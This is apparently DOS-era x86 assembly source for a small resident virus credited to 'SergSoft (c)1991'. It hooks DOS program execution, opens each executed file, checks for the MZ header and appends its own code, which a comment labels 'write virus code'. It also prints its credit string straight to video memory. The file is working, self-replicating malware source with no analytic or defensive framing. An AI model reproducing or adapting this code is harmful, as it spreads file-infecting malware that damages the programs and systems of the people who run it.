

.286
.model tiny
.radix 16
.code
a       equ     0C5
        org     100
e:      dec     bp
        push	si
        push	si
        push    cs
        push	cs
        scasw
        mov     al,2Ah
        ;mov	bl,1
        inc	bx
        mov     es,ax
        pusha
        cmpsw
        popa
        mov     cl,(l-e)/2
        rep     movsw           ;es:di = 2E:l-e  ds:si = CS:l-e+100
        mov	ds,bx
        jz	f
        push	ax
        xchg	[di],ax
        stosw
        pop	ax
        xchg	[di],ax
        stosw
        sub	ds:[0403],di
        ;mov	ah,48
        ;mov	bh,0f
        ;int	a
        ;stosw
f:	pop	ds
	lodsw
	xchg	ax,cx
	pop	es
	pop	di
	rep	movsb
	ret
h:      pusha
	cld
        push    ds
        push    es
        xor     ah,4bh
        jnz     j               ;if not 'exec'
        mov     ax,3D02         ;open file
        int     a
        jc      j               ;if not found
        xchg	ax,bx
        xor	di,di
        mov	ch,8c
        mov	ds,cx
        push	ds
        pop	es
        mov     ch,0FA          ;all bytes
        mov     dx,2
        mov     ah,3F
        int     a               ;read all bytes
        stosw
        cmp     byte ptr [di],4dh
        jz      i
        add     ax,dx
        push    ax
        mov     ax,4200
        cwd
        mov     cx,dx
        int     a
        mov     ah,40
        push    cs
        pop     ds              ;ds = 31
        mov     cl,l-e
        int     a               ;write virus code
        mov     ah,40
        push    es
        pop     ds
        pop     cx
        int     a
i:      mov     ah,3E
        int     a
j:      pop     es
        pop     ds
        popa
r:      db      0EA
l:      dw      60      
d:      mov     si,c-d+100
	mov	di,640d
	push	0b800
	pop	es
	mov	cx,en-c
	mov	ah,0fh
pri:	lodsb
	stosw
	loop	pri
        ret
c:      db      ' Virus loader by SergSoft (c)1991'
en:
end     e

